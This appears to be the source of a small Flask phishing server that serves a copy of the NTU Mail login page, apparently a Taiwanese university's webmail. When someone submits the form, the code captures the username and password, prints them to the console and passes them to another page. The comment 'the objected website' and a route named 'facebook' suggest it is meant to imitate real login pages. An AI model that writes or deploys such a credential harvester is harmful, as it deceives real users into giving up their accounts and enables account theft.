import os

from flask import Flask, session, render_template, request, redirect
from flask_session import Session
from sqlalchemy import create_engine
from sqlalchemy.orm import scoped_session, sessionmaker

from flask import jsonify
import time

app = Flask(__name__)

# Check for environment variable
# if not os.getenv("DATABASE_URL"):
#     raise RuntimeError("DATABASE_URL is not set")

# Configure session to use filesystem
app.config["SESSION_PERMANENT"] = False
app.config["SESSION_TYPE"] = "filesystem"
Session(app)

# Set up database
# engine = create_engine(os.getenv("DATABASE_URL"))
# db = scoped_session(sessionmaker(bind=engine))

# setting for the objected website
account_tag_name = "username"
password_input_name = "password"

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        username = request.form.get(account_tag_name)
        password = request.form.get(password_input_name)
        
        # validate of input
        if not username or not password:
            return redirect('/ntumail')

        print("username: {}, password: {}".format(username, password) )
        
        return render_template("login.html", username=username, password=password)
    else:
        return redirect('/ntumail')

@app.route('/ntumail', methods=["GET", "POST"])
def facebook():
    return render_template("NTU Mail copy.html")
